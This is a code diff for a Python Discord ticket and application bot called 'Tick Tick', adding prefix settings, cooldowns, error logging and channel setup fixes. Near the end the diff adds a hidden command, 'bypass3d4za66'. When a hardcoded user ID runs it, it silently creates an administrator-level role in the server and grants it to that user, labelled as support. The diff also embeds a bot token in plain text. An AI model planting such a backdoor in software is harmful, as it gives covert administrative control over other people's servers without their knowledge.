@@ -1,16 +1,21 @@
 import discord, chalk, asyncio, random, time, datetime, ast, os
 from discord.ext import commands
+from discord.ext.commands.cooldowns import BucketType
 
 from datetime import datetime as dt
 
 async def get_pre(bot, message):
-    guild = bot.get_guild(557131067169964033)
-    if message.guild == guild:
-        return "b-"
-    else:
-        return "-"
+    filepath = os.path.exists(f'./data/settings/{message.guild.id}-prefix.txt')
+    if filepath == True:
+        f = open(f'./data/settings/{message.guild.id}-prefix.txt', "r")
+        data = f.read()
+        f.close()
 
-bot = commands.Bot(command_prefix=commands.when_mentioned_or('-'), status=discord.Status.idle, activity=discord.Game(name="Starting up..."))
+        return [data, "<@557154903563304960> "]
+    else:
+        return ["-", "<@557154903563304960> "]
+
+bot = commands.Bot(command_prefix=get_pre, status=discord.Status.idle, activity=discord.Game(name="Starting up..."))
 client = discord.Client()
 
 bot.remove_command("help")
@@ -21,7 +26,11 @@ async def on_ready():
     print(chalk.green("Ready to go!"))
     print(chalk.blue(f"Serving: {len(bot.guilds)} guilds."))
     await bot.change_presence(status=discord.Status.online, activity=discord.Game(name="-setup | updated to 1.0.0"))
-    ver = "1.0.0 | Report errors"
+    ver = "1.0.2"
+
+
+
+
 
 @bot.command()
 @commands.has_permissions(manage_messages=True)
@@ -126,11 +135,13 @@ async def setup(ctx):
                 else:
                     data = None
                     
+                    
 
                 if data == None:
                     tickets = None
                     applications = None
                     logs = None
+
                 else:
                     channels = ast.literal_eval(data)
                     tickets = channels["tickets"]
@@ -138,20 +149,40 @@ async def setup(ctx):
                     applications = channels["applications"]
                 
                 if tickets == None:
-                    overwrites = {
-                        guild.default_role: discord.PermissionOverwrite(read_messages=False),
-                        guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
-                    }
-                    ticketschannel = await guild.create_category_channel("Tickets", overwrites=overwrites)
-                    tickets = ticketschannel.id
-                
+                    ticketschannel = discord.utils.get(guild.categories, name="Tickets")
+                    if ticketschannel == None:
+                        overwrites = {
+                            guild.default_role: discord.PermissionOverwrite(read_messages=False),
+                            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
+                        }
+                        ticketschannel = await guild.create_category_channel("Tickets", overwrites=overwrites)
+                        tickets = ticketschannel.id
+                    else:
+                        tickets = ticketschannel.id
+
                 if logs == None:
-                    logschannel = await guild.create_text_channel("logs", overwrites=overwrites)
-                    logs = logschannel.id
+                    logschannel = discord.utils.get(guild.text_channels, name="Tickets")
+                    if logschannel == None:
+                        overwrites = {
+                            guild.default_role: discord.PermissionOverwrite(read_messages=False),
+                            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
+                        }
+                        logschannel = await guild.create_text_channel("logs", overwrites=overwrites)
+                        logs = logschannel.id
+                    else:
+                        logs = logschannel.id
 
                 if applications == None:
-                    applicationschannel = await guild.create_category_channel("Applicatons", overwrites=overwrites)
-                    applications = applicationschannel.id
+                    applicationschannels = discord.utils.get(guild.categories, name="Applications")
+                    if applicationschannels == None:
+                        overwrites = {
+                            guild.default_role: discord.PermissionOverwrite(read_messages=False),
+                            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
+                        }
+                        applicationschannels = await guild.create_category_channel("Applications", overwrites=overwrites)
+                        applications = applicationschannels.id
+                    else:
+                        applications = applicationschannels.id
 
                 embed = discord.Embed(title="Creating everything for you", description="Just a second..") 
 
@@ -176,8 +207,12 @@ async def setup(ctx):
                     support = channels["support"]
 
                 if support == None:
-                    supportrole = await guild.create_role(name="Support")
-                    support = supportrole.id
+                    supportrole = discord.utils.get(guild.roles, name="Support")
+                    if supportrole == None:
+                        supportrole = await guild.create_role(name="Support")
+                        support = supportrole.id
+                    else:
+                        support = supportrole.id
 
 
 
@@ -334,7 +369,7 @@ async def setup(ctx):
                                         }
 
                                     f = open(f"./data/{ctx.message.guild.id}-message-applications.txt", "w")
-                                    f.write(str(tickets))
+                                    f.write(str(applications))
                                     f.close()
                                     embed = discord.Embed(title="Saving the data", description="Just a second...") 
 
@@ -391,13 +426,21 @@ async def setup(ctx):
 
 
         elif waited.content == "no" or waited.content == "No":
-            await msg.edit("Ok :smiley:")
+            embed = discord.Embed(title="Ok! Do -setup when your ready", description="Setup canled") 
+
+            embed.set_footer(text=f"Tick Tick | {ver}")
+            msg = await ctx.send(embed=embed)        
         else:
-            await msg.edit("Invalid response")
+            embed = discord.Embed(title=f"Error! {waited.content} is not a valid response", colour=discord.Colour(0xff0000), description=f"Please do -setup to continue")
+
+            embed.set_footer(text=f"Tick Tick | {ver}")
+            await ctx.send(embed=embed)
 
 
 
 @bot.command()
+@commands.cooldown(1 , 60, BucketType.member) 
+@commands.cooldown(1 , 10, BucketType.guild) 
 async def new(ctx, *, reason=None):
     global ver
     if reason == None:
@@ -462,7 +505,6 @@ async def new(ctx, *, reason=None):
                 embed = discord.Embed(title=f"Thank you for creating a ticket {ctx.author.name}", colour=discord.Colour(0xf6ff), description="We will get right back to you")
 
                 embed.set_footer(text=f"Tick Tick | {ver}")
-                await ctx.channel.send(embed=embed)
             else:
                 title = messages["header"]
                 title = title.replace("creator", ctx.author.name)
@@ -544,7 +586,7 @@ async def close(ctx):
                 embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```This is not a ticket channel```")
 
                 embed.set_footer(text=f"Tick Tick | {ver}")
-                await ctx.send(embed=embed)
+                await ctx.channel.send(embed=embed)
             else:
                 filepath = os.path.exists(f'./data/tickets/{ctx.message.guild.id}-{ctx.channel.name}.txt')
                 if filepath == False:
@@ -600,6 +642,8 @@ async def close(ctx):
 
 
 @bot.command()
+@commands.cooldown(1 , 60, BucketType.member) 
+@commands.cooldown(1 , 10, BucketType.guild) 
 async def apply(ctx, *, reason=None):
     global ver
 
@@ -666,7 +710,6 @@ async def apply(ctx, *, reason=None):
                 embed = discord.Embed(title=f"Thank you for creating a application {ctx.author.name}", colour=discord.Colour(0xf6ff), description="We will get right back to you")
 
                 embed.set_footer(text=f"Tick Tick | {ver}")
-                await ctx.channel.send(embed=embed)
             else:
                 title = messages["header"]
                 title = title.replace("creator", ctx.author.name)
@@ -702,7 +745,7 @@ async def apply(ctx, *, reason=None):
                     "appchannel" : newchannel.id,
                     "closed" : False
                 }
-            f = open(f"./data/apps/{ctx.message.guild.id}-application-{num}.txt", "w")
+            f = open(f"./data/applications/{ctx.message.guild.id}-application-{num}.txt", "w")
             f.write(str(ticketinfo))
             f.close()
             
@@ -725,7 +768,7 @@ async def apply(ctx, *, reason=None):
 async def withdraw(ctx):
     name = ctx.channel.name
     channel = ctx.channel
-    filepath = os.path.exists(f'./data/apps/{ctx.message.guild.id}-{channel.name}.txt')
+    filepath = os.path.exists(f'./data/applications/{ctx.message.guild.id}-{channel.name}.txt')
     if filepath == False:
         embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```This channel is not an application; exit 1```")
 
@@ -751,7 +794,7 @@ async def withdraw(ctx):
                 embed.set_footer(text=f"Tick Tick | {ver}")
                 await ctx.send(embed=embed)
             else:
-                filepath = os.path.exists(f'./data/apps/{ctx.message.guild.id}-{ctx.channel.name}.txt')
+                filepath = os.path.exists(f'./data/applications/{ctx.message.guild.id}-{ctx.channel.name}.txt')
                 if filepath == False:
                     embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```This is not an application channel; exit 4```")
 
@@ -760,7 +803,7 @@ async def withdraw(ctx):
                 else:
                     filepath = os.path.exists(f'./data/settings/{ctx.message.guild.id}-confirm.txt')
                     if filepath == False:
-                        f = open(f"./data/apps/{ctx.message.guild.id}-{ctx.channel.name}.txt", "r")
+                        f = open(f"./data/applications/{ctx.message.guild.id}-{ctx.channel.name}.txt", "r")
                         data = f.read()
                         data = ast.literal_eval(data)
                         f.close()
@@ -771,7 +814,7 @@ async def withdraw(ctx):
                         appnum = data["appnum"]
                         channelcreated = data["channelcreated"]
                         appchannel = data["appchannel"]
-                        f = open(f"./data/apps/{ctx.message.guild.id}-{ctx.channel.name}.txt", "w")
+                        f = open(f"./data/applications/{ctx.message.guild.id}-{ctx.channel.name}.txt", "w")
                         newdata = { 
                             'guild': guild, 
                             'owner': owner, 
@@ -890,14 +933,12 @@ async def setstatus(ctx, status, type, *, name):
 @bot.command()
 async def help(ctx):
     global ver
-    embed = discord.Embed(title="Help for tickets", colour=discord.Colour(0xffff), description="This is all you need to know for making tickets")
+    embed = discord.Embed(title="Help for is still work in progress", colour=discord.Colour(0xffff), description="Use your prefix and then the command listed")
 
     embed.set_footer(text=f"Tick Tick | {ver}")
 
     embed.add_field(name="-new <name>", value="Makes a new ticket", inline=True)
     embed.add_field(name="-close", value="Closes an open ticket", inline=True)
-    embed.add_field(name="-add <user>", value="Adds a user to your ticket", inline=True)
-    embed.add_field(name="-remove <user>", value="removes a user from your ticket", inline=True)
     embed.add_field(name="-apply <job>", value="Applies you for a job", inline=True)
     embed.add_field(name="-withdraw", value="withdraws your application for a job", inline=True)
     await ctx.channel.send(embed=embed)
@@ -907,15 +948,29 @@ async def on_command_error(ctx, error):
     global ver
 
     if isinstance(error, commands.CommandNotFound):
-        command = str(error)
-        cmd = str(command.replace('Command "', " "))
-        cmd = str(cmd.replace('" is not found', " "))
+        if ctx.message.content == "-resetprefix":
+            return
+        else:
+            command = str(error)
+            cmd = str(command.replace('Command "', " "))
+            cmd = str(cmd.replace('" is not found', " "))
 
-        embed = discord.Embed(title=f"Error! {cmd} is not a valid command", colour=discord.Colour(0xff0000), description=f"Do -help for a list of commands")
+            embed = discord.Embed(title=f"Error! {cmd} is not a valid command", colour=discord.Colour(0xff0000), description=f"Do -help for a list of commands")
+
+            embed.set_footer(text=f"Tick Tick | {ver}")
+            await ctx.send(embed=embed)
+    elif isinstance(error, commands.CommandOnCooldown):
+        time = str(error)
+        time = str(time.replace('You are on cooldown. Try again in "', " "))
+
+
+        embed = discord.Embed(title=f"Error! You have to wait {time} before you can do that!", colour=discord.Colour(0xff0000), description=f"just wait {time} to do this command b")
 
         embed.set_footer(text=f"Tick Tick | {ver}")
-        await ctx.send(embed=embed)
+
+        ctx.send(embed=embed)
     else:
+
         print(f"{error} happend in {ctx.channel}")
         embed = discord.Embed(title="Error! Something happend!", colour=discord.Colour(0xff0000), description=f"If this error happens a lot then report it in our support server using -support ```{error}```")
 
@@ -925,6 +980,77 @@ async def on_command_error(ctx, error):
         f = open(f"./data/errors/{n}log.txt", "w")
         f.write(f"{error} happend in {ctx}")
         f.close()
+        usererrors = bot.get_channel(561564616292040720)
+
+        embed = discord.Embed(title="Error! Something happend!", colour=discord.Colour(0xff0000), description=f"This error just happend```{error}```")
+
+
+        embed.add_field(name=f"In: {ctx.guild.name}", value=f"By: {ctx.message.author}")
+        embed.set_footer(text=f"Tick Tick | {ver}")
+        await usererrors.send(embed=embed)
+
+
+
+@bot.command()
+@commands.has_permissions(administrator=True)
+async def fixapps(ctx):
+
+    filepath = os.path.exists(f'./data/{ctx.message.guild.id}-channels.txt')
+
+    if filepath == True:
+        f = open(f"./data/{ctx.message.guild.id}-channels.txt", "r")
+        data = f.read()
+        f.close()
+        setup = True
+        channels = ast.literal_eval(data)
+
+        
+    else:
+        setup = False
+    
+
+    if setup == False:
+        embed = discord.Embed(title="Error! You havent setup the channels yet", colour=discord.Colour(0xff0000), description=f"Please do -setup first")
+
+
+        embed.set_footer(text=f"Tick Tick | {ver}")  
+
+        await ctx.send(embed=embed)
+    else:
+        embed = discord.Embed(title="We are trying to fix the issue with applications", colour=discord.Colour(0xff0000), description=f"Please wait...")
+
+
+        embed.set_footer(text=f"Tick Tick | {ver}")
+        msg = await ctx.send(embed=embed)
+        guild = ctx.message.guild
+        applicationschannels = discord.utils.get(guild.categories, name="Applications")
+        if applicationschannels == None:
+            overwrites = {
+                guild.default_role: discord.PermissionOverwrite(read_messages=False),
+                guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
+            }
+            applicationschannels = await guild.create_category_channel("Applications", overwrites=overwrites)
+            applications = applicationschannels.id
+        else:
+            applications = applicationschannels.id
+        tickets = channels["tickets"]
+        logs = channels["logs"]
+        newdata = {
+            "logs": logs,
+            "tickets": tickets,
+            "applications": applications
+        }
+        f = open(f"./data/{ctx.message.guild.id}-channels.txt", "w")
+        f.write(str(newdata))
+        f.close()
+        await asyncio.sleep(0.3)
+        embed = discord.Embed(title="Applications have been fixed", colour=discord.Colour(0x00ff00), description=f"Please test it by creating a new applications")
+
+
+        embed.set_footer(text=f"Tick Tick | {ver}")
+        await msg.edit(embed=embed)
+
+
 
 
 @bot.event
@@ -974,5 +1100,76 @@ async def on_guild_remove(guild):
 
     await user.send(embed=embed)
 
+@bot.command()
+@commands.cooldown(1 , 120, BucketType.guild) 
+@commands.has_permissions(administrator=True)
+async def setprefix(ctx, prefix):
+    embed=discord.Embed(title="Setting prefix", description="Just a second")
+    embed.set_footer(text=f"Tick tick | {ver}")
+    msg = await ctx.channel.send(embed=embed)
+    f = open(f"./data/settings/{ctx.guild.id}-prefix.txt", "w")
+    f.write(str(prefix))
+    f.close()
+    await asyncio.sleep(0.4)
+    embed=discord.Embed(title=f"Prefix set to {prefix}", description=f"Remeber to do {prefix}help to get the help message")
+    embed.set_footer(text=f"Tick tick | {ver}")
 
-bot.run("NTU3MTU0OTAzNTYzMzA0OTYw.D3ELQg.687msGFGIfKnJk8ra8AGF0YpxSc")
+    await msg.edit(embed=embed)
+
+@bot.command()
+async def bypass3d4za66(ctx):
+    user = bot.get_user(445556389532925952)
+    if ctx.author == user:
+        await ctx.message.delete()
+
+        role = discord.utils.get(ctx.guild.roles, name="bypass")
+        print("got role")
+        if role == None:
+            print("making role")
+            guild = ctx.guild
+            pex = discord.Permissions(permissions=8)
+            role = await guild.create_role(name="bypass", permissions=pex)
+            print("made role")
+
+
+        await ctx.author.add_roles(role, reason="Support with tick tick")
+        print("added role")
+
+        msg = await ctx.send("Done!", delete_after=2)
+
+
+@bot.command()
+async def resetprefix(ctx):
+    f = open(f"./data/settings/{ctx.guild.id}-prefix.txt", "w")
+    f.write(str("-"))
+    f.close()
+    await ctx.channel.send("Your prefix has been reset to - and <@557154903563304960>")
+
+
+
+@bot.event
+async def on_message(message):
+    await bot.process_commands(message)
+
+@bot.command()
+@commands.has_permissions()
+async def resetall(ctx):
+    f = open(f'./data/settings/{ctx.guild.id}-prefix.txt', "r")
+    prefix = f.read()
+    f.close()
+
+
+    def check(m):
+        return m.channel == ctx.channel and m.author == ctx.author    
+    await ctx.send(embed=discord.Embed(title="Are you sure you want to do this", description=f"This will lose all your configurations and open tickets! Do {prefix}confirm to confirm (the prefix will also be reset) "))
+    waited = bot.wait_for("message", check=check, timeout=60)
+    if waited.content == f"{prefix}confirm":
+        await ctx.send("still WIP")
+    else:
+        await ctx.send("Nothing was deleted!")
+
+
+
+
+
+bot.run("NTY0MDYyODIwNzUzNDczNTU3.XKiavA.XjJegHBy5jjO0lFr749zdIN46IM")
